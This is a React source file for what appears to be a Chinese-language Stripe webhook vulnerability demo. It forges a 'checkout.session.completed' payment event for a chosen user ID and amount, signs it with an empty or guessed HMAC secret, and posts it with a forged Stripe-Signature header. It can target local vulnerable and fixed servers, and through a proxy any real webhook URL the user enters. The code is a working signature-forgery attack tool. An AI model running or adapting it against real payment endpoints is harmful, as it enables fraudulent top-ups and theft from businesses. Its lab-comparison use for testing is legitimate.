import React, { useState } from 'react';
import { Terminal, Shield, ShieldAlert, Zap, Server, Code, Activity, CheckCircle, XCircle, Globe } from 'lucide-react';
import CryptoJS from 'crypto-js';
import clsx from 'clsx';

// Types
type TargetEnv = 'vuln' | 'fixed' | 'custom';

interface LogEntry {
  time: string;
  type: 'info' | 'success' | 'error' | 'request' | 'response' | 'warning';
  message: string;
  details?: any;
}

function App() {
  const [target, setTarget] = useState<TargetEnv>('vuln');
  const [customUrl, setCustomUrl] = useState('https://your-test-site.com/api/stripe/webhook');
  const [clientId, setClientId] = useState('USR-9999-HACK-123456');
  const [amount, setAmount] = useState(9999);
  const [secret, setSecret] = useState('');
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [isHacking, setIsHacking] = useState(false);

  const addLog = (type: LogEntry['type'], message: string, details?: any) => {
    setLogs(prev => [...prev, {
      time: new Date().toLocaleTimeString(),
      type,
      message,
      details
    }]);
  };

  const forgeSignature = (payloadStr: string, secretKey: string, timestamp: string) => {
    const signedPayload = `${timestamp}.${payloadStr}`;
    const hash = CryptoJS.HmacSHA256(signedPayload, secretKey);
    const v1 = hash.toString(CryptoJS.enc.Hex);
    return `t=${timestamp},v1=${v1}`;
  };

  const executeAttack = async () => {
    setIsHacking(true);
    setLogs([]); // Clear previous logs
    addLog('info', '开始构造攻击载荷 (Payload)...');

    const payload = {
      id: "evt_test_forgery_" + Math.random().toString(36).substring(7),
      type: "checkout.session.completed",
      data: {
        object: {
          id: "cs_test_hacked_" + Math.random().toString(36).substring(7),
          client_reference_id: clientId,
          status: "complete",
          payment_status: "paid",
          amount_total: amount * 100 // Stripe expects cents
        }
      }
    };

    // Serialize payload exactly as needed (no spaces)
    const jsonBody = JSON.stringify(payload);
    addLog('info', 'Payload 构造完成', payload);

    const timestamp = Math.floor(Date.now() / 1000).toString();
    addLog('info', `使用 Secret: "${secret}" 生成伪造签名...`);
    
    const signature = forgeSignature(jsonBody, secret, timestamp);
    addLog('info', `生成签名 (Stripe-Signature): ${signature}`);

    let endpoint = '';
    let fetchUrl = '';
    let extraHeaders: Record<string, string> = {};

    if (target === 'vuln') {
      endpoint = '/api/vuln/api/stripe/webhook';
      fetchUrl = endpoint;
    } else if (target === 'fixed') {
      endpoint = '/api/fixed/api/stripe/webhook';
      fetchUrl = endpoint;
    } else {
      endpoint = customUrl;
      // 当选择自定义站点时，前端不再直接请求外部 URL（会被 CORS 拦截），而是发给 Vite 代理服务器
      fetchUrl = '/api/proxy';
      // 将真实的外部目标 URL 放在请求头里，让后端的 Vite Proxy 解析并动态转发
      extraHeaders['X-Target-Url'] = customUrl;
    }
    
    addLog('request', `POST ${endpoint}`, {
      headers: {
        'Content-Type': 'application/json',
        'Stripe-Signature': signature
      },
      body: payload
    });

    if (target === 'custom') {
      addLog('info', 'ℹ️ 提示：为了解决浏览器 CORS 跨域问题，该请求已被路由至本地 Vite 代理服务器进行转发。真实请求将被发送至 -> ' + customUrl);
    }

    try {
      const response = await fetch(fetchUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Stripe-Signature': signature,
          ...extraHeaders // 附加给代理服务器解析的特殊 Header
        },
        body: jsonBody
      });

      const responseText = await response.text();
      
      addLog('response', `服务端响应状态码: ${response.status} ${response.statusText}`, responseText);

      if (response.ok) {
        addLog('success', '🎉 攻击成功！服务端已接受伪造的请求并执行了业务逻辑。');
      } else {
        addLog('error', '❌ 攻击失败，服务端拒绝了伪造请求。');
      }
    } catch (error: any) {
      addLog('error', `网络请求失败: ${error.message} (可能目标地址不可达或代理服务器异常)`);
    } finally {
      setIsHacking(false);
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-300 font-sans selection:bg-emerald-500/30 pb-10">
      {/* Header */}
      <header className="border-b border-slate-800 bg-slate-900/80 backdrop-blur-md sticky top-0 z-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 h-14 sm:h-16 flex items-center justify-between">
          <div className="flex items-center gap-2 sm:gap-3">
            <div className="p-1.5 sm:p-2 bg-rose-500/10 rounded-lg shrink-0">
              <ShieldAlert className="w-5 h-5 sm:w-6 sm:h-6 text-rose-500" />
            </div>
            <div className="min-w-0">
              <h1 className="font-bold text-slate-100 text-sm sm:text-base truncate">Stripe Webhook 漏洞测试平台</h1>
              <p className="text-[10px] sm:text-xs text-slate-500 truncate">签名伪造攻击演示 UI</p>
            </div>
          </div>
          <div className="flex items-center shrink-0 ml-2">
            <span className="flex items-center gap-1.5 sm:gap-2 text-[10px] sm:text-xs font-medium px-2 sm:px-3 py-1 sm:py-1.5 rounded-full bg-slate-800 text-slate-400 border border-slate-700">
              <Activity className="w-3 h-3 sm:w-4 sm:h-4 text-emerald-500" />
              <span className="hidden sm:inline">系统就绪</span>
              <span className="sm:hidden">就绪</span>
            </span>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 py-6 sm:py-8 grid lg:grid-cols-12 gap-6 sm:gap-8">
        
        {/* Left Column: Controls & Flow */}
        <div className="lg:col-span-4 space-y-6">
          
          {/* Attack Configuration */}
          <section className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden shadow-2xl shadow-black/50">
            <div className="px-4 sm:px-5 py-3 sm:py-4 border-b border-slate-800 flex items-center gap-2">
              <Zap className="w-4 h-4 sm:w-5 sm:h-5 text-amber-500" />
              <h2 className="font-semibold text-slate-100 text-sm sm:text-base">攻击向量配置</h2>
            </div>
            
            <div className="p-4 sm:p-5 space-y-4 sm:space-y-5">
              {/* Target Env */}
              <div className="space-y-2">
                <label className="text-[10px] sm:text-xs font-semibold text-slate-400 uppercase tracking-wider">目标环境</label>
                <div className="grid grid-cols-3 gap-2 sm:gap-2">
                  <button
                    onClick={() => setTarget('vuln')}
                    className={`flex flex-col items-center justify-center p-2 rounded-lg border transition-all ${
                      target === 'vuln' 
                        ? 'border-rose-500 bg-rose-500/10 text-rose-400' 
                        : 'border-slate-700 bg-slate-800 text-slate-400 hover:border-slate-600'
                    }`}
                  >
                    <Server className="w-4 h-4 sm:w-5 sm:h-5 mb-1" />
                    <span className="text-[10px] sm:text-xs font-medium mt-1">漏洞版 (本地)</span>
                  </button>
                  <button
                    onClick={() => setTarget('fixed')}
                    className={`flex flex-col items-center justify-center p-2 rounded-lg border transition-all ${
                      target === 'fixed' 
                        ? 'border-emerald-500 bg-emerald-500/10 text-emerald-400' 
                        : 'border-slate-700 bg-slate-800 text-slate-400 hover:border-slate-600'
                    }`}
                  >
                    <Shield className="w-4 h-4 sm:w-5 sm:h-5 mb-1" />
                    <span className="text-[10px] sm:text-xs font-medium mt-1">安全版 (本地)</span>
                  </button>
                  <button
                    onClick={() => setTarget('custom')}
                    className={`flex flex-col items-center justify-center p-2 rounded-lg border transition-all ${
                      target === 'custom' 
                        ? 'border-indigo-500 bg-indigo-500/10 text-indigo-400' 
                        : 'border-slate-700 bg-slate-800 text-slate-400 hover:border-slate-600'
                    }`}
                  >
                    <Globe className="w-4 h-4 sm:w-5 sm:h-5 mb-1" />
                    <span className="text-[10px] sm:text-xs font-medium mt-1">自定义站点</span>
                  </button>
                </div>
              </div>

              {/* Custom URL Input (Conditional) */}
              {target === 'custom' && (
                <div className="space-y-2 animate-in fade-in slide-in-from-top-2 duration-200">
                  <label className="text-[10px] sm:text-xs font-semibold text-indigo-400 uppercase tracking-wider flex items-center gap-1">
                    <Globe className="w-3 h-3" /> 自定义 Webhook URL
                  </label>
                  <input
                    type="url"
                    value={customUrl}
                    onChange={(e) => setCustomUrl(e.target.value)}
                    placeholder="https://..."
                    className="w-full bg-indigo-950/20 border border-indigo-500/30 rounded-lg px-3 sm:px-4 py-2 sm:py-2.5 text-sm text-indigo-200 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all placeholder:text-indigo-800/50 font-mono"
                  />
                  <p className="text-[10px] sm:text-[11px] text-slate-500 leading-tight">
                    输入您要测试的互联网真实 Webhook 端点。由于浏览器跨域 (CORS) 限制，您的请求可能会被浏览器拦截（即使攻击本身可能有效）。
                  </p>
                </div>
              )}

              {/* Secret Key */}
              <div className="space-y-2">
                <label className="text-[10px] sm:text-xs font-semibold text-slate-400 uppercase tracking-wider">签名密钥 (Secret)</label>
                <input
                  type="text"
                  value={secret}
                  onChange={(e) => setSecret(e.target.value)}
                  placeholder="留空以执行空密钥攻击"
                  className="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 sm:px-4 py-2 sm:py-2.5 text-sm text-slate-300 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all placeholder:text-slate-600 font-mono"
                />
                <p className="text-[10px] sm:text-[11px] text-slate-500 leading-tight">用于对请求载荷进行签名的 Stripe HMAC 密钥。</p>
              </div>

              {/* Client ID */}
              <div className="space-y-2">
                <label className="text-[10px] sm:text-xs font-semibold text-slate-400 uppercase tracking-wider">目标用户 ID</label>
                <input
                  type="text"
                  value={clientId}
                  onChange={(e) => setClientId(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 sm:px-4 py-2 sm:py-2.5 text-sm text-slate-300 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all font-mono"
                />
              </div>

              {/* Amount */}
              <div className="space-y-2">
                <label className="text-[10px] sm:text-xs font-semibold text-slate-400 uppercase tracking-wider">充值金额</label>
                <div className="relative">
                  <span className="absolute left-3 sm:left-4 top-1/2 -translate-y-1/2 text-slate-500 font-mono">$</span>
                  <input
                    type="number"
                    value={amount}
                    onChange={(e) => setAmount(Number(e.target.value))}
                    className="w-full bg-slate-950 border border-slate-700 rounded-lg pl-7 sm:pl-8 pr-3 sm:pr-4 py-2 sm:py-2.5 text-sm text-slate-300 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all font-mono"
                  />
                </div>
              </div>

              {/* Action */}
              <button
                onClick={executeAttack}
                disabled={isHacking}
                className="w-full relative group overflow-hidden rounded-lg mt-2 sm:mt-4 disabled:opacity-70 disabled:cursor-not-allowed active:scale-[0.98] transition-transform touch-manipulation"
              >
                <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-indigo-500 via-purple-500 to-rose-500 opacity-80 group-hover:opacity-100 transition-opacity"></div>
                <div className="relative px-4 sm:px-6 py-3 sm:py-3.5 flex items-center justify-center gap-2 text-white font-bold tracking-wide text-sm sm:text-base">
                  {isHacking ? (
                    <span className="flex items-center gap-2">
                      <div className="w-4 h-4 sm:w-5 sm:h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                      执行中...
                    </span>
                  ) : (
                    <span className="flex items-center gap-2">
                      <Code className="w-4 h-4 sm:w-5 sm:h-5" />
                      执行攻击
                    </span>
                  )}
                </div>
              </button>
            </div>
          </section>

          {/* Explainer */}
          <section className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden shadow-lg p-4 sm:p-5 hidden lg:block">
            <h3 className="text-sm font-semibold text-slate-300 mb-4 flex items-center gap-2">
              <Activity className="w-4 h-4 text-indigo-400" />
              攻击流程图解
            </h3>
            <div className="space-y-4">
              {[
                { step: 1, text: "构造虚假订单会话载荷 (Payload)" },
                { step: 2, text: "使用空密钥对载荷进行哈希计算" },
                { step: 3, text: "向指定的 Webhook URL 发送 POST 请求" },
                { step: 4, text: "服务端验证签名 (若密钥为空则验证通过)" },
                { step: 5, text: "成功触发目标的业务逻辑" },
              ].map((item, idx) => (
                <div key={idx} className="flex items-start gap-3">
                  <div className="w-5 h-5 sm:w-6 sm:h-6 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-[10px] sm:text-xs font-mono text-slate-400 shrink-0">
                    {item.step}
                  </div>
                  <p className="text-xs sm:text-sm text-slate-400 leading-tight pt-0.5 sm:pt-1">{item.text}</p>
                </div>
              ))}
            </div>
          </section>
        </div>

        {/* Right Column: Terminal */}
        <div className="lg:col-span-8 flex flex-col h-[500px] lg:h-[650px]">
          <section className="flex-1 bg-[#0a0a0a] border border-slate-800 rounded-xl overflow-hidden shadow-2xl shadow-black/50 flex flex-col font-mono text-xs sm:text-sm relative">
            
            {/* Terminal Header */}
            <div className="px-3 sm:px-4 py-2.5 sm:py-3 bg-slate-900 border-b border-slate-800 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Terminal className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-slate-500" />
                <span className="text-slate-400 text-[10px] sm:text-xs tracking-wider">攻击终端 // STDOUT</span>
              </div>
              <div className="flex gap-1.5">
                <div className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-rose-500/20 border border-rose-500/50"></div>
                <div className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-amber-500/20 border border-amber-500/50"></div>
                <div className="w-2.5 h-2.5 sm:w-3 sm:h-3 rounded-full bg-emerald-500/20 border border-emerald-500/50"></div>
              </div>
            </div>

            {/* Terminal Output */}
            <div className="flex-1 p-3 sm:p-5 overflow-y-auto space-y-3 scrollbar-thin scrollbar-thumb-slate-700 scrollbar-track-transparent pb-10">
              {logs.length === 0 ? (
                <div className="text-slate-600 flex items-center gap-2 h-full justify-center">
                  <Terminal className="w-4 h-4 sm:w-5 sm:h-5 opacity-50" />
                  等待执行...
                </div>
              ) : (
                logs.map((log, index) => (
                  <div key={index} className="animate-in fade-in slide-in-from-bottom-2 duration-300">
                    <div className="flex items-start gap-2 sm:gap-3">
                      <span className="text-slate-600 shrink-0 select-none text-[10px] sm:text-xs pt-0.5 sm:pt-0">[{log.time}]</span>
                      <div className="flex-1 overflow-hidden">
                        
                        {/* Log Message */}
                        <span className={clsx(
                          "whitespace-pre-wrap break-words",
                          log.type === 'info' && "text-blue-400",
                          log.type === 'success' && "text-emerald-400 font-bold",
                          log.type === 'error' && "text-rose-400 font-bold",
                          log.type === 'warning' && "text-amber-500 font-semibold",
                          log.type === 'request' && "text-amber-400",
                          log.type === 'response' && "text-purple-400"
                        )}>
                          {log.type === 'success' && <CheckCircle className="w-3.5 h-3.5 sm:w-4 sm:h-4 inline mr-1 sm:mr-1.5 -mt-0.5 sm:-mt-1" />}
                          {log.type === 'error' && <XCircle className="w-3.5 h-3.5 sm:w-4 sm:h-4 inline mr-1 sm:mr-1.5 -mt-0.5 sm:-mt-1" />}
                          {log.type === 'warning' && <ShieldAlert className="w-3.5 h-3.5 sm:w-4 sm:h-4 inline mr-1 sm:mr-1.5 -mt-0.5 sm:-mt-1" />}
                          {log.message}
                        </span>

                        {/* Details JSON */}
                        {log.details && (
                          <div className="mt-1.5 sm:mt-2 bg-black/50 p-2 sm:p-3 rounded border border-slate-800/50 overflow-x-auto text-[10px] sm:text-xs text-slate-300">
                            {typeof log.details === 'string' ? (
                              <pre>{log.details}</pre>
                            ) : (
                              <pre>{JSON.stringify(log.details, null, 2)}</pre>
                            )}
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                ))
              )}
              {isHacking && (
                <div className="flex items-center gap-2 text-slate-500 animate-pulse mt-2">
                  <span className="w-1.5 h-3 sm:w-2 sm:h-4 bg-slate-500 block"></span>
                </div>
              )}
            </div>
          </section>
        </div>

      </main>
    </div>
  );
}

export default App;
